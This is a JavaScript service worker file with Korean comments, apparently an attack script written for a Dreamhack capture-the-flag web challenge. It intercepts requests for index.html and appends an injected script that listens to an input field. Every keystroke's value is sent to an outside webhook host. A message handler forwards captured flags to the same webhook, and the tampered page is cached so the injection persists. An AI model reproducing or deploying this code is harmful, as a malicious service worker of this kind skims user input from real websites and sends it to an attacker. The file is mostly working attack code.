
  // sw.js - Service Worker 파일
  const WEBHOOK = 'https://rhjifzf.request.dreamhack.games';

  // Service Worker 설치
  self.addEventListener('install', (event) => {
      console.log('Service Worker installed');
      self.skipWaiting();
  });

  // Service Worker 활성화
  self.addEventListener('activate', (event) => {
      console.log('Service Worker activated');
      self.clients.claim();
  });

  // 모든 fetch 요청 감시
  self.addEventListener('fetch', (event) => {
      const url = event.request.url;

      // index.html 페이지 요청 감시
      if (url.includes('/index.html') || url === 'http://web:8080/') {
          event.respondWith(
              fetch(event.request).then((response) => {
                  // 응답을 복사
                  const clonedResponse = response.clone();

                  // 응답 텍스트 추출
                  clonedResponse.text().then((text) => {
                      // index.html 내용에 script 주입
                      const modifiedText = text + `
                      <script>
                          const WEBHOOK = '${WEBHOOK}';

                          // DOM에서 input 요소 감시
                          setTimeout(() => {
                              const input = document.getElementById('input');
                              if (input) {
                                  input.addEventListener('input', (e) => {
                                      const flag = e.target.value;
                                      // 웹훅으로 전송
                                      fetch(WEBHOOK + '?flag=' + encodeURIComponent(flag), {
                                          mode: 'no-cors'
                                      }).catch(() => {});
                                  });
                              }
                          }, 100);
                      </script>
                      `;

                      // 수정된 응답 반환
                      const modifiedResponse = new Response(modifiedText, {
                          status: response.status,
                          statusText: response.statusText,
                          headers: response.headers
                      });

                      // 캐시에 저장
                      caches.open('v1').then((cache) => {
                          cache.put(event.request, modifiedResponse.clone());
                      });

                      return modifiedResponse;
                  });

                  return response;
              })
          );
      } else {
          event.respondWith(fetch(event.request));
      }
  });

  // 메시지 수신 (클라이언트에서 데이터 받기)
  self.addEventListener('message', (event) => {
      if (event.data.type === 'FLAG_CAPTURED') {
          const flag = event.data.flag;

          // 웹훅으로 전송
          fetch(WEBHOOK + '?flag=' + encodeURIComponent(flag), {
              mode: 'no-cors'
          }).catch(() => {});
      }
  });
